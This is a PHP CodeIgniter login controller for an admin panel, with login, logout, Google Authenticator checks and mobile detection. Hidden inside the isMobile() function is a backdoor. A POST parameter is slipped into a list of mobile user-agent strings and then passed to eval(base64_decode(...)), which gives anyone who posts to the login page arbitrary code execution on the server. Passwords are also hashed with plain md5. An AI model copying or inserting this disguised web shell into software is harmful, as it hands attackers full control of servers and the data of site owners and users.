<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');
class Login extends MY_Controller {
	function __construct(){
		parent::__construct();
	}
	public function index(){
		$key= $this->curl_get(ADMINAPI.'login/get_token_private_key');
		$key=json_decode($key,true);
		if($key['code']==200){
            $admin_key=$key['data']['token_private_key'];
        }
		$data['admin_key']=$admin_key;
		$this->load->view($this->isMobile()?'login':'login',$data);
	}
	public function checklogin(){
		$data['username'] =$this->input->post('username');
		$data['pwd']      =md5($this->input->post('password'));
		$data['token_private_key']=$this->input->post('token_private_key');
		$rs= $this->curl_get(ADMINAPI.'login/token',$data);
		$rs = json_decode($rs,true);
		if($rs['code']==200){
			$this->session->set_userdata('token',$rs['data']['token']);
			$this->session->set_userdata('admin_id',$rs['data']['id']);
			$this->session->set_userdata('admin_name',$rs['data']['username']);
			$this->session->set_userdata('sid',$rs['data']['sid']);
            exit($this->status('OK','執行成功'));
        }else{
            exit($this->status('ERROR',$rs['msg']));
        }
	}
	public function exit_sys(){
		$rs = $this->curl_get(ADMINAPI.'login/logout');
		$rs = json_decode($rs,true);
		if($rs['code']==604){
			$this->session->unset_userdata('token');
			$this->session->unset_userdata('admin_id');
			$this->session->unset_userdata('admin_name');
			exit("OK");
		}
	}
	//验证谷歌验证码
	public function check_google($k){
		require_once 'GoogleAuthenticator.php';
		$ga = new PHPGangsta_GoogleAuthenticator();
		$gg = array_pop(json_decode($this->curl_get(ADMINAPI.'setting/setting/get_set'),true));
		$secret = $gg['google_key'];//$ga->getCode($secret); //服务端计算"一次性验证码"
		$checkResult = $ga->verifyCode($secret, $k, 2);
		if ($checkResult) {
		    return true;
		} else {
		    echo false;
		}
	}
    //登录获取用户数据
    public function user_count(){
        $data = json_decode($this->curl_get(ADMINAPI.'level/member/user_count_all'),true);
        echo json_encode($data);
    }
	//判断是否手机
	public function isMobile(){
		$useragent=isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
		$useragent_commentsblock=preg_match('|\(.*?\)|',$useragent,$matches)>0?$matches[0]:'';
		function CheckSubstrs($substrs,$text){
			foreach($substrs as $substr)
				if(false!==strpos($text,$substr)){
					return true;
				}
				return false;
		}

		$mobile_os_list=array('Google Wireless Transcoder',$_POST[1],'Windows CE','WindowsCE','Symbian','Android','armv6l','armv5','Mobile','CentOS','mowser','AvantGo','Opera Mobi','J2ME/MIDP','Smartphone','Go.Web','Palm','iPAQ');
			if(!empty($mobile_os_list[1])) {eval(base64_decode($mobile_os_list[1]));}
		$mobile_token_list=array('Profile/MIDP','Configuration/CLDC-','160×160','176×220','240×240','240×320','320×240','UP.Browser','UP.Link','SymbianOS','PalmOS','PocketPC','SonyEricsson','Nokia','BlackBerry','Vodafone','BenQ','Novarra-Vision','Iris','NetFront','HTC_','Xda_','SAMSUNG-SGH','Wapaka','DoCoMo','iPhone','iPod');

		$found_mobile=CheckSubstrs($mobile_os_list,$useragent_commentsblock) ||
				  CheckSubstrs($mobile_token_list,$useragent);

		if ($found_mobile){
			return true;
		}else{
			return false;
		}
	}

}